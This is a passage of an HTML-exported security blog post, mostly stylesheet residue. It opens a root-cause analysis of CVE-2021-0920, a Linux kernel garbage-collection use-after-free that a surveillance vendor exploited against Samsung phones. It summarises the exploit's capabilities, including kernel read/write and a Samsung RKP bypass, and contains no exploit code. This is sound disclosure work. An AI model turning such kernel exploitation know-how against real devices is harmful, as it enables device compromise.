counter(lst-ctn-kix_p4ttii5g8cnl-4,lower-latin) \". \"}.lst-kix_mfudkcwv2w89-4&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-4}.lst-kix_51hgl6mwb3et-0&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-0}.lst-kix_hk8k8itxmlfp-2&gt;li{counter-increment:lst-ctn-kix_hk8k8itxmlfp-2}.lst-kix_3a2g7o19wgb3-1&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-1}.lst-kix_58ja23nrczhl-0&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-0,decimal) \". \"}ul.lst-kix_g3pd9wzbzpzz-0{list-style-type:none}ol.lst-kix_iptxq54yrrnf-2.start{counter-reset:lst-ctn-kix_iptxq54yrrnf-2 0}ol.lst-kix_mfudkcwv2w89-8.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-8 0}ul.lst-kix_g3pd9wzbzpzz-4{list-style-type:none}ul.lst-kix_g3pd9wzbzpzz-3{list-style-type:none}ul.lst-kix_g3pd9wzbzpzz-2{list-style-type:none}ul.lst-kix_g3pd9wzbzpzz-1{list-style-type:none}.lst-kix_8mkn8rg9im4a-0&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-0}.lst-kix_p4ttii5g8cnl-7&gt;li:before{content:\"\" counter(lst-ctn-kix_p4ttii5g8cnl-7,lower-latin) \". \"}.lst-kix_58ja23nrczhl-3&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-3,decimal) \". \"}.lst-kix_mfudkcwv2w89-7&gt;li{counter-increment:lst-ctn-kix_mfudkcwv2w89-7}.lst-kix_9prd8pa3o8y7-4&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-4}ol.lst-kix_mfudkcwv2w89-1.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-1 0}.lst-kix_58ja23nrczhl-1&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-1,lower-latin) \". \"}.lst-kix_51hgl6mwb3et-3&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-3}.lst-kix_g3pd9wzbzpzz-2&gt;li:before{content:\"-  \"}.lst-kix_g3pd9wzbzpzz-0&gt;li:before{content:\"-  \"}.lst-kix_g3pd9wzbzpzz-8&gt;li:before{content:\"-  \"}.lst-kix_dqkfvt9lb2wy-4&gt;li:before{content:\"-  \"}.lst-kix_j5vmamheymgq-4&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-4}ul.lst-kix_g3pd9wzbzpzz-8{list-style-type:none}.lst-kix_7y90gfloiotx-5&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-5}ul.lst-kix_g3pd9wzbzpzz-7{list-style-type:none}ul.lst-kix_g3pd9wzbzpzz-6{list-style-type:none}ul.lst-kix_g3pd9wzbzpzz-5{list-style-type:none}.lst-kix_dqkfvt9lb2wy-2&gt;li:before{content:\"-  \"}.lst-kix_yn2ql2u2egdg-7&gt;li:before{content:\"-  \"}ol.lst-kix_mfudkcwv2w89-3.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-3 0}.lst-kix_mfudkcwv2w89-5&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-5,lower-roman) \". \"}.lst-kix_k47gmg94hbw2-7&gt;li:before{content:\"-  \"}.lst-kix_mfudkcwv2w89-3&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-3,decimal) \". \"}.lst-kix_k47gmg94hbw2-1&gt;li:before{content:\"-  \"}.lst-kix_3a2g7o19wgb3-5&gt;li{counter-increment:lst-ctn-kix_3a2g7o19wgb3-5}.lst-kix_yn2ql2u2egdg-5&gt;li:before{content:\"-  \"}ol.lst-kix_mfudkcwv2w89-6.start{counter-reset:lst-ctn-kix_mfudkcwv2w89-6 0}.lst-kix_5oipgjcxugcr-7&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-7,lower-latin) \". \"}.lst-kix_9gryrzygx46m-5&gt;li:before{content:\"-  \"}ol.lst-kix_9prd8pa3o8y7-8.start{counter-reset:lst-ctn-kix_9prd8pa3o8y7-8 0}.lst-kix_3a2g7o19wgb3-4&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-4,lower-latin) \". \"}.lst-kix_5oipgjcxugcr-1&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-1,lower-latin) \". \"}.lst-kix_3a2g7o19wgb3-6&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-6,decimal) \". \"}.lst-kix_yzib59bcdnhj-3&gt;li:before{content:\"-  \"}.lst-kix_yzib59bcdnhj-1&gt;li:before{content:\"-  \"}.lst-kix_9gryrzygx46m-3&gt;li:before{content:\"-  \"}ul.lst-kix_whw4pjgxp3w1-7{list-style-type:none}ul.lst-kix_whw4pjgxp3w1-8{list-style-type:none}.lst-kix_h1p96gz9lzq4-1&gt;li:before{content:\"-  \"}ul.lst-kix_whw4pjgxp3w1-3{list-style-type:none}ul.lst-kix_whw4pjgxp3w1-4{list-style-type:none}ul.lst-kix_whw4pjgxp3w1-5{list-style-type:none}.lst-kix_u3opzkdcnklc-2&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-2}ul.lst-kix_whw4pjgxp3w1-6{list-style-type:none}ol.lst-kix_j5vmamheymgq-0.start{counter-reset:lst-ctn-kix_j5vmamheymgq-0 0}.lst-kix_9prd8pa3o8y7-7&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-7,lower-latin) \". \"}ul.lst-kix_whw4pjgxp3w1-0{list-style-type:none}ul.lst-kix_whw4pjgxp3w1-1{list-style-type:none}.lst-kix_h1p96gz9lzq4-3&gt;li:before{content:\"-  \"}ul.lst-kix_whw4pjgxp3w1-2{list-style-type:none}.lst-kix_9prd8pa3o8y7-1&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-1,lower-latin) \". \"}ol.lst-kix_5yi4tofw6s0z-8.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-8 0}.lst-kix_zcvcgbx5ju56-5&gt;li:before{content:\"-  \"}.lst-kix_zcvcgbx5ju56-3&gt;li:before{content:\"-  \"}ol.lst-kix_5oipgjcxugcr-7.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-7 0}ul.lst-kix_1m9wqzg4mvqt-0{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-0.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-0 0}ol.lst-kix_mfudkcwv2w89-0{list-style-type:none}ol.lst-kix_mfudkcwv2w89-1{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-4{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-3{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-2{list-style-type:none}.lst-kix_5oipgjcxugcr-3&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-3}ul.lst-kix_1m9wqzg4mvqt-1{list-style-type:none}.lst-kix_5yi4tofw6s0z-2&gt;li{counter-increment:lst-ctn-kix_5yi4tofw6s0z-2}.lst-kix_j5vmamheymgq-0&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-0}.lst-kix_f96hgc2s4b68-2&gt;li:before{content:\"-  \"}.lst-kix_p4ttii5g8cnl-3&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-3}.lst-kix_f96hgc2s4b68-7&gt;li:before{content:\"-  \"}ol.lst-kix_5oipgjcxugcr-5.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-5 0}.lst-kix_7y90gfloiotx-2&gt;li{counter-increment:lst-ctn-kix_7y90gfloiotx-2}.lst-kix_5yi4tofw6s0z-7&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-7,lower-latin) \". \"}.lst-kix_u3opzkdcnklc-5&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-5,lower-roman) \". \"}ol.lst-kix_5yi4tofw6s0z-6.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-6 0}.lst-kix_u3opzkdcnklc-2&gt;li:before{content:\"\" counter(lst-ctn-kix_u3opzkdcnklc-2,lower-roman) \". \"}.lst-kix_5yi4tofw6s0z-4&gt;li:before{content:\"\" counter(lst-ctn-kix_5yi4tofw6s0z-4,lower-latin) \". \"}.lst-kix_51hgl6mwb3et-6&gt;li{counter-increment:lst-ctn-kix_51hgl6mwb3et-6}ol.lst-kix_5yi4tofw6s0z-5.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-5 0}.lst-kix_5oipgjcxugcr-7&gt;li{counter-increment:lst-ctn-kix_5oipgjcxugcr-7}ul.lst-kix_dqkfvt9lb2wy-2{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-3{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-4{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-5{list-style-type:none}ol.lst-kix_iptxq54yrrnf-2{list-style-type:none}ol.lst-kix_iptxq54yrrnf-1{list-style-type:none}ol.lst-kix_iptxq54yrrnf-0{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-0{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-1{list-style-type:none}ol.lst-kix_iptxq54yrrnf-6{list-style-type:none}ol.lst-kix_iptxq54yrrnf-5{list-style-type:none}ol.lst-kix_iptxq54yrrnf-4{list-style-type:none}ol.lst-kix_iptxq54yrrnf-3{list-style-type:none}ol.lst-kix_iptxq54yrrnf-8{list-style-type:none}ol.lst-kix_iptxq54yrrnf-7{list-style-type:none}.lst-kix_t1ae57uxlfl0-5&gt;li:before{content:\"-  \"}ul.lst-kix_1m9wqzg4mvqt-8{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-7{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-6{list-style-type:none}ul.lst-kix_1m9wqzg4mvqt-5{list-style-type:none}.lst-kix_9prd8pa3o8y7-7&gt;li{counter-increment:lst-ctn-kix_9prd8pa3o8y7-7}.lst-kix_8mkn8rg9im4a-3&gt;li{counter-increment:lst-ctn-kix_8mkn8rg9im4a-3}ol.lst-kix_5oipgjcxugcr-4.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-4 0}.lst-kix_t1ae57uxlfl0-2&gt;li:before{content:\"-  \"}ul.lst-kix_dqkfvt9lb2wy-6{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-7{list-style-type:none}ul.lst-kix_dqkfvt9lb2wy-8{list-style-type:none}.lst-kix_g3pd9wzbzpzz-5&gt;li:before{content:\"-  \"}.lst-kix_aj3gpabmyk88-7&gt;li:before{content:\"-  \"}ol.lst-kix_5oipgjcxugcr-4{list-style-type:none}ol.lst-kix_5oipgjcxugcr-3{list-style-type:none}.lst-kix_58ja23nrczhl-6&gt;li:before{content:\"\" counter(lst-ctn-kix_58ja23nrczhl-6,decimal) \". \"}ol.lst-kix_5oipgjcxugcr-2{list-style-type:none}ol.lst-kix_5oipgjcxugcr-3.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-3 0}ul.lst-kix_zcvcgbx5ju56-7{list-style-type:none}ol.lst-kix_5oipgjcxugcr-1{list-style-type:none}.lst-kix_yjo4cwnqbjp0-7&gt;li:before{content:\"-  \"}ul.lst-kix_zcvcgbx5ju56-8{list-style-type:none}ol.lst-kix_5oipgjcxugcr-0{list-style-type:none}ol.lst-kix_5oipgjcxugcr-8{list-style-type:none}ol.lst-kix_5oipgjcxugcr-7{list-style-type:none}ol.lst-kix_5oipgjcxugcr-6{list-style-type:none}ol.lst-kix_5oipgjcxugcr-5{list-style-type:none}.lst-kix_whw4pjgxp3w1-7&gt;li:before{content:\"-  \"}.lst-kix_58ja23nrczhl-7&gt;li{counter-increment:lst-ctn-kix_58ja23nrczhl-7}.lst-kix_p4ttii5g8cnl-6&gt;li{counter-increment:lst-ctn-kix_p4ttii5g8cnl-6}.lst-kix_mfudkcwv2w89-8&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-8,lower-roman) \". \"}.lst-kix_yn2ql2u2egdg-2&gt;li:before{content:\"-  \"}.lst-kix_mfudkcwv2w89-0&gt;li:before{content:\"\" counter(lst-ctn-kix_mfudkcwv2w89-0,decimal) \". \"}.lst-kix_k47gmg94hbw2-4&gt;li:before{content:\"-  \"}.lst-kix_dqkfvt9lb2wy-7&gt;li:before{content:\"-  \"}ol.lst-kix_5oipgjcxugcr-1.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-1 0}ul.lst-kix_aj3gpabmyk88-6{list-style-type:none}.lst-kix_5oipgjcxugcr-4&gt;li:before{content:\"\" counter(lst-ctn-kix_5oipgjcxugcr-4,lower-latin) \". \"}ul.lst-kix_aj3gpabmyk88-7{list-style-type:none}ol.lst-kix_5yi4tofw6s0z-2.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-2 0}ul.lst-kix_aj3gpabmyk88-8{list-style-type:none}.lst-kix_9gryrzygx46m-0&gt;li:before{content:\"-  \"}.lst-kix_9gryrzygx46m-8&gt;li:before{content:\"-  \"}.lst-kix_j5vmamheymgq-7&gt;li{counter-increment:lst-ctn-kix_j5vmamheymgq-7}ul.lst-kix_aj3gpabmyk88-2{list-style-type:none}ul.lst-kix_aj3gpabmyk88-3{list-style-type:none}ul.lst-kix_aj3gpabmyk88-4{list-style-type:none}.lst-kix_iptxq54yrrnf-6&gt;li:before{content:\"\" counter(lst-ctn-kix_iptxq54yrrnf-6,decimal) \". \"}ul.lst-kix_aj3gpabmyk88-5{list-style-type:none}.lst-kix_3a2g7o19wgb3-1&gt;li:before{content:\"\" counter(lst-ctn-kix_3a2g7o19wgb3-1,lower-latin) \". \"}ul.lst-kix_aj3gpabmyk88-0{list-style-type:none}ul.lst-kix_aj3gpabmyk88-1{list-style-type:none}.lst-kix_u3opzkdcnklc-5&gt;li{counter-increment:lst-ctn-kix_u3opzkdcnklc-5}.lst-kix_6l3lpr6ytz51-5&gt;li:before{content:\"-  \"}ul.lst-kix_f96hgc2s4b68-0{list-style-type:none}.lst-kix_9prd8pa3o8y7-4&gt;li:before{content:\"\" counter(lst-ctn-kix_9prd8pa3o8y7-4,lower-latin) \". \"}ol.lst-kix_5oipgjcxugcr-0.start{counter-reset:lst-ctn-kix_5oipgjcxugcr-0 0}ul.lst-kix_f96hgc2s4b68-2{list-style-type:none}ul.lst-kix_f96hgc2s4b68-1{list-style-type:none}ul.lst-kix_f96hgc2s4b68-4{list-style-type:none}ul.lst-kix_f96hgc2s4b68-3{list-style-type:none}ul.lst-kix_f96hgc2s4b68-6{list-style-type:none}ul.lst-kix_f96hgc2s4b68-5{list-style-type:none}ul.lst-kix_f96hgc2s4b68-8{list-style-type:none}ul.lst-kix_f96hgc2s4b68-7{list-style-type:none}.lst-kix_1m9wqzg4mvqt-5&gt;li:before{content:\"-  \"}.lst-kix_7y90gfloiotx-6&gt;li:before{content:\"\" counter(lst-ctn-kix_7y90gfloiotx-6,decimal) \". \"}.lst-kix_8mkn8rg9im4a-1&gt;li:before{content:\"\" counter(lst-ctn-kix_8mkn8rg9im4a-1,lower-latin) \". \"}.lst-kix_zcvcgbx5ju56-0&gt;li:before{content:\"-  \"}.lst-kix_zcvcgbx5ju56-8&gt;li:before{content:\"-  \"}.lst-kix_j5vmamheymgq-2&gt;li:before{content:\"\" counter(lst-ctn-kix_j5vmamheymgq-2,lower-roman) \". \"}ol.lst-kix_mfudkcwv2w89-8{list-style-type:none}ol.lst-kix_mfudkcwv2w89-6{list-style-type:none}ol.lst-kix_mfudkcwv2w89-7{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-5{list-style-type:none}ol.lst-kix_mfudkcwv2w89-4{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-6{list-style-type:none}ol.lst-kix_mfudkcwv2w89-5{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-7{list-style-type:none}ol.lst-kix_mfudkcwv2w89-2{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-8{list-style-type:none}ol.lst-kix_mfudkcwv2w89-3{list-style-type:none}.lst-kix_yzib59bcdnhj-6&gt;li:before{content:\"-  \"}ol.lst-kix_9prd8pa3o8y7-1{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-2{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-3{list-style-type:none}ol.lst-kix_9prd8pa3o8y7-4{list-style-type:none}.lst-kix_h1p96gz9lzq4-6&gt;li:before{content:\"-  \"}ol.lst-kix_5yi4tofw6s0z-1.start{counter-reset:lst-ctn-kix_5yi4tofw6s0z-1 0}ol.lst-kix_9prd8pa3o8y7-0{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.ykcrMYlEiJ-c18{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:540pt;border-top-color:#e0e0e0;border-bottom-style:solid}.ykcrMYlEiJ-c4{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:180pt;border-top-color:#000000;border-bottom-style:solid}.ykcrMYlEiJ-c24{padding-top:16pt;border-top-width:0pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;border-top-style:solid;background-color:#ffffff;border-bottom-width:0pt;border-bottom-style:solid;text-align:left}.ykcrMYlEiJ-c1{color:#1976d2;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:\"Arial\";font-style:normal}.ykcrMYlEiJ-c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.ykcrMYlEiJ-c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.ykcrMYlEiJ-c30{padding-top:10pt;padding-bottom:10pt;line-height:1.0;page-break-after:avoid;text-align:left}.ykcrMYlEiJ-c6{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left;height:11pt}.ykcrMYlEiJ-c31{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.ykcrMYlEiJ-c36{color:#1976d2;font-weight:700;font-size:15pt;font-style:normal}.ykcrMYlEiJ-c33{border-spacing:0;border-collapse:collapse;margin-right:auto}.ykcrMYlEiJ-c35{font-size:10pt;font-family:Consolas,\"Courier New\";color:#c53929;font-weight:400}.ykcrMYlEiJ-c14{font-size:10pt;font-family:Consolas,\"Courier New\";color:#9c27b0;font-weight:400}.ykcrMYlEiJ-c0{font-size:10pt;font-family:Consolas,\"Courier New\";color:#000000;font-weight:400}.ykcrMYlEiJ-c23{font-size:10pt;font-family:Consolas,\"Courier New\";color:#455a64;font-weight:400}.ykcrMYlEiJ-c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.ykcrMYlEiJ-c10{font-size:10pt;font-family:Consolas,\"Courier New\";color:#616161;font-weight:400}.ykcrMYlEiJ-c22{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.ykcrMYlEiJ-c9{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.ykcrMYlEiJ-c43{color:#1976d2;font-size:12pt;font-family:\"Raleway\"}.ykcrMYlEiJ-c3{font-family:Consolas,\"Courier New\";color:#0d904f;font-weight:400}.ykcrMYlEiJ-c8{font-family:\"Times New Roman\";font-style:italic;font-weight:400}.ykcrMYlEiJ-c50{text-decoration:none;vertical-align:baseline;font-family:\"Times New Roman\"}.ykcrMYlEiJ-c51{color:#424242;font-size:15pt;font-family:\"Roboto\"}.ykcrMYlEiJ-c11{vertical-align:sub;font-family:\"Times New Roman\";font-weight:400}.ykcrMYlEiJ-c34{text-decoration:none;vertical-align:baseline;font-family:\"Arial\"}.ykcrMYlEiJ-c13{text-decoration:none;vertical-align:baseline;font-style:normal}.ykcrMYlEiJ-c52{color:#666666;font-size:15pt}.ykcrMYlEiJ-c16{border:1px solid black;margin:5px}.ykcrMYlEiJ-c47{font-size:15pt;color:#1976d2}.ykcrMYlEiJ-c27{padding:0;margin:0}.ykcrMYlEiJ-c19{color:#000000;font-size:11pt}.ykcrMYlEiJ-c41{color:#1976d2;font-size:14pt}.ykcrMYlEiJ-c21{margin-left:72pt;padding-left:0pt}.ykcrMYlEiJ-c45{max-width:540pt;padding:36pt 36pt 36pt 36pt}.ykcrMYlEiJ-c32{font-weight:700;font-style:italic}.ykcrMYlEiJ-c20{orphans:2;widows:2}.ykcrMYlEiJ-c37{text-decoration:none;font-style:normal}.ykcrMYlEiJ-c15{font-weight:400;font-family:\"Times New Roman\"}.ykcrMYlEiJ-c44{font-weight:400;font-family:\"Cambria Math\"}.ykcrMYlEiJ-c25{margin-left:36pt;padding-left:0pt}.ykcrMYlEiJ-c26{color:inherit;text-decoration:inherit}.ykcrMYlEiJ-c49{font-weight:400}.ykcrMYlEiJ-c7{background-color:#ffff00}.ykcrMYlEiJ-c29{height:11pt}.ykcrMYlEiJ-c28{background-color:#ffffff}.ykcrMYlEiJ-c40{vertical-align:sub}.ykcrMYlEiJ-c42{font-style:normal}.ykcrMYlEiJ-c38{font-style:italic}.ykcrMYlEiJ-c46{height:23.9pt}.ykcrMYlEiJ-c48{margin-left:36pt}.ykcrMYlEiJ-c39{font-weight:700}.ykcrMYlEiJ-c17{height:0pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:10pt;color:#1976d2;font-weight:700;font-size:15pt;padding-bottom:10pt;font-family:\"Arial\";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:10pt;color:#1976d2;font-size:14pt;padding-bottom:10pt;font-family:\"Arial\";line-height:1.0;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c28 c45 doc-content\"&gt;\n &lt;p class=\"c20 c24 subtitle\" id=\"h.y3ub1og6t2w0\"&gt;&lt;span class=\"c34 c49 c42 c52\"&gt;A deep dive into an in-the-wild Android exploit&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Guest Post by Xingyu Jin, Android Security Research&lt;br&gt;&lt;br&gt;&lt;/span&gt;&lt;span&gt;This is part one of a two-part guest blog post, where first we&amp;#39;ll look at the &lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-0920.html\"&gt;root cause&lt;/a&gt;&lt;/span&gt; of the CVE-2021-0920 vulnerability. In the second post, we&amp;#39;ll dive &lt;/span&gt;&lt;span&gt;into the in&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;the&lt;/span&gt;&lt;span&gt;-wild 0-day exploitation of the vulnerability and post-compromise modules.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.ki897ei81q67\"&gt;&lt;span&gt;Overview of in-the-wild CVE-2021-0920 exploits&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;A surveillance vendor &lt;/span&gt;&lt;span&gt;named Wintego&lt;/span&gt;&lt;span&gt;&amp;nbsp;has developed an exploit for Linux socket syscall 0-day, CVE-2021-0920, and used it in the wild since &lt;/span&gt;&lt;span&gt;at least November 2020 based on the earliest captured sample&lt;/span&gt;&lt;span&gt;, until the issue was fixed in November 2021. &amp;nbsp;Combined with Chrome and Samsung browser &lt;/span&gt;&lt;span&gt;exploits&lt;/span&gt;&lt;span&gt;, the vendor was able to remotely root Samsung devices. The fix was released with the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://source.android.com/security/bulletin/2021-11-01\"&gt;November 2021 Android Security Bulletin&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;, and applied to Samsung devices in Samsung&amp;#39;s December 2021 security update.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Google&amp;#39;s Threat Analysis Group (TAG) discovered Samsung browser exploit chains being used in the wild. TAG then performed root cause analysis and discovered that this vulnerability, CVE-2021-0920, was being used to escape the sandbox and elevate privileges. &lt;/span&gt;&lt;span&gt;CVE-2021-0920 was reported to Linux/Android anonymously. The Google Android Security Team performed&lt;/span&gt;&lt;span&gt;&amp;nbsp;the full deep-dive analysis of the exploit.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;This issue was initially discovered in 2016 by a RedHat kernel developer and disclosed in a public email thread, but the Linux kernel community &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://patchwork.ozlabs.org/project/netdev/patch/CAOssrKcfncAYsQWkfLGFgoOxAQJVT2hYVWdBA6Cw7hhO8RJ_wQ@mail.gmail.com/\"&gt;did not patch&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;the issue until it was re-reported in 2021.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Various Samsung devices were targeted, including the Samsung S10 and S20. By abusing an ephemeral race condition in Linux kernel garbage collection, the exploit code was able to obtain a use-after-free (UAF) in a kernel &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk_buff&lt;/span&gt;&lt;span&gt;&amp;nbsp;object. The in-the-wild sample could effectively circumvent &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;CONFIG_ARM64_UAO&lt;/span&gt;&lt;span&gt;, achieve arbitrary read / write primitives and bypass Samsung RKP to elevate to root.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Other Android devices&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;were also vulnerable, but we did not find any exploit samples against them.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Text extracted from captured samples dubbed the vulnerability &amp;ldquo;quantum Linux kernel garbage collection&amp;rdquo;, which appears to be a fitting title for this blogpost.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.q8pevpc2sw6u\"&gt;&lt;span class=\"ykcrMYlEiJ-c36 ykcrMYlEiJ-c34\"&gt;Introduction&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;CVE-2021-0920 is a use-after-free (UAF) due to a race condition in the garbage collection system for &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a control message that allows unix-domain sockets to transmit an open file descriptor from one process to another. In other words, the sender transmits a file descriptor and the receiver then obtains a file descriptor from the sender. This passing of file descriptors adds complexity to reference-counting file structs. To account for this, the Linux kernel community designed a special garbage collection 